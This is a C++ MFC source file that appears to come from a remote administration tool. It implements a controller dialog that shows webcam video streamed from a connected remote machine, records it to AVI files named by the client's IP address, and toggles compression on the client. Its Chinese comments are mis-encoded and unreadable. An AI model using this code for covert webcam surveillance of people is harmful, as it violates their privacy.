// VideoDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "VideoDlg.h"
#include "afxdialogex.h"


enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// ��Ƶѹ��
	IDM_SAVEAVI,					// ����¼��
};
// CVideoDlg �Ի���

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)

AVISTREAMINFO CBmpToAvi::m_si;

CBmpToAvi::CBmpToAvi()
{
	m_pfile = NULL;
	m_pavi = NULL;
	AVIFileInit();
}

CBmpToAvi::~CBmpToAvi()
{
	AVIFileExit();
}

bool CBmpToAvi::Open( LPCTSTR szFile, LPBITMAPINFO lpbmi )
{
	if (szFile == NULL)
		return false;
	m_nFrames = 0;

	if (AVIFileOpen(&m_pfile, szFile, OF_WRITE | OF_CREATE, NULL))
		return false;

	m_si.fccType = streamtypeVIDEO;
	m_si.fccHandler = BI_RGB;
	m_si.dwScale = 1;
	m_si.dwRate = 8; // ֡��
	SetRect(&m_si.rcFrame, 0, 0, lpbmi->bmiHeader.biWidth, lpbmi->bmiHeader.biHeight);
	m_si.dwSuggestedBufferSize = lpbmi->bmiHeader.biSizeImage;

	if (AVIFileCreateStream(m_pfile, &m_pavi, &m_si))
		return false;


	if (AVIStreamSetFormat(m_pavi, 0, lpbmi, sizeof(BITMAPINFO)) != AVIERR_OK)
		return false;

	return true;
}

bool CBmpToAvi::Write(LPVOID lpBuffer)
{
	if (m_pfile == NULL || m_pavi == NULL)
		return false;

	return AVIStreamWrite(m_pavi, m_nFrames++, 1, lpBuffer, m_si.dwSuggestedBufferSize, AVIIF_KEYFRAME, NULL, NULL) == AVIERR_OK;	
}


void CBmpToAvi::Close()
{
	if (m_pavi)
	{
		AVIStreamRelease(m_pavi);
		m_pavi = NULL;
	}
	if (m_pfile)
	{
		AVIFileRelease(m_pfile);
		m_pfile = NULL;
	}		
}


void CVideoDlg::SaveAvi(void)
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile.Empty();
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "��Ƶ�ļ�(*.avi)|*.avi|", this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_BitmapInfor_Full))
	{
		MessageBox("����¼���ļ�ʧ��:"+m_aviFile, "��ʾ");
		m_aviFile.Empty();
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}
}


CVideoDlg::CVideoDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: DialogBase(CVideoDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_CAMERA)
{
	m_nCount = 0;
	m_aviFile.Empty();
	m_BitmapInfor_Full = NULL;
	m_pVideoCodec      = NULL;

	m_BitmapData_Full = NULL;
	m_BitmapCompressedData_Full = NULL;
	ResetScreen();
}


void CVideoDlg::ResetScreen(void)
{
	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	int	iBitMapInforSize = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;  
	m_BitmapInfor_Full	= (LPBITMAPINFO) new BYTE[iBitMapInforSize];
	m_ContextObject->InDeCompressedBuffer.CopyBuffer(m_BitmapInfor_Full, iBitMapInforSize, 1);
	m_BitmapData_Full	= new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
	m_BitmapCompressedData_Full	= new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
}

CVideoDlg::~CVideoDlg()
{
	if (!m_aviFile.IsEmpty())
	{
		SaveAvi();
		m_aviFile.Empty();
	}

	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}

	if (m_BitmapData_Full)
	{
		delete m_BitmapData_Full;
		m_BitmapData_Full = NULL;
	}

	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_BitmapCompressedData_Full)
	{
		delete m_BitmapCompressedData_Full;
		m_BitmapCompressedData_Full = NULL;
	}
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
END_MESSAGE_MAP()


// CVideoDlg ��Ϣ�������


BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		m_hDD = DrawDibOpen();

		m_hDC = ::GetDC(m_hWnd);
		SysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "��Ƶѹ��(&C)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "����¼��(&V)");
		SysMenu->AppendMenu(MF_SEPARATOR);

		CString strString;

		strString.Format("%s - ��Ƶ���� %d��%d", m_IPAddress, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);

		SetWindowText(strString);

		BYTE bToken = COMMAND_NEXT;

		m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
	}

	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	return TRUE;
}

void CVideoDlg::OnClose()
{
	if (!m_aviFile.IsEmpty())
	{
		SaveAvi();
		m_aviFile.Empty();
	}

	CancelIO();

	DialogBase::OnClose();
}

void CVideoDlg::OnReceiveComplete(void)
{
	++m_nCount;

	switch (m_ContextObject->InDeCompressedBuffer.GetBYTE(0))
	{
	case TOKEN_WEBCAM_DIB:
		{
			DrawDIB();//�����ǻ�ͼ������ת�����Ĵ��뿴һ��
			break;
		}
	default:
		// ���䷢���쳣����
		break;
	}
}

void CVideoDlg::DrawDIB(void)
{
	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu == NULL)
		return;

	const int nHeadLen = 1 + 1 + 4;       

	Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(0);
	LPBYTE	szBuffer = tmp.Buf();
	UINT	ulBufferLen = m_ContextObject->InDeCompressedBuffer.GetBufferLength();
	if (szBuffer[1] == 0) // û�о���H263ѹ����ԭʼ���ݣ�����Ҫ����
	{
		// ��һ�Σ�û��ѹ����˵������˲�֧��ָ���Ľ�����
		if (m_nCount == 1)
		{
			SysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		SysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_BitmapData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen);
	}
	else // ����
	{
		////���ﻺ������ĵĵڶ����ַ��������Ƿ���Ƶ���� 
		InitCodec(*(LPDWORD)(szBuffer + 2)); //�ж�
		if (m_pVideoCodec != NULL)
		{
			SysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_BitmapCompressedData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen); //��Ƶû�н�ѹ
			//���￪ʼ���룬��������ͬδѹ����һ���� ��ʾ���Ի����ϡ� ��������ʼ��Ƶ�����avi��ʽ
			m_pVideoCodec->DecodeVideoData(m_BitmapCompressedData_Full, ulBufferLen - nHeadLen, 
				(LPBYTE)m_BitmapData_Full, NULL,  NULL);  //����Ƶ���ݽ�ѹ
		}
	}

	PostMessage(WM_PAINT);
}


void CVideoDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_BitmapInfor_Full, fccHandler))
	{
		Mprintf("======> InitCompressor failed \n");
		delete m_pVideoCodec;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
		// ֪ͨ����˲�����ѹ��
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}
}


void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	switch (nID)
	{
	case IDM_SAVEAVI:
		{
			SaveAvi();
			break;
		}
	case IDM_ENABLECOMPRESS:
		{
			CMenu *pSysMenu = GetSystemMenu(FALSE);
			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
			break;
		}
	}

	CDialog::OnSysCommand(nID, lParam);
}


void CVideoDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting

	if (m_BitmapData_Full==NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);

	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_BitmapInfor_Full,
		m_BitmapData_Full,
		0, 0,
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_BitmapData_Full);
		// ��ʾ����¼��
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		const LPCTSTR lpTipsString = "Recording";
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
}
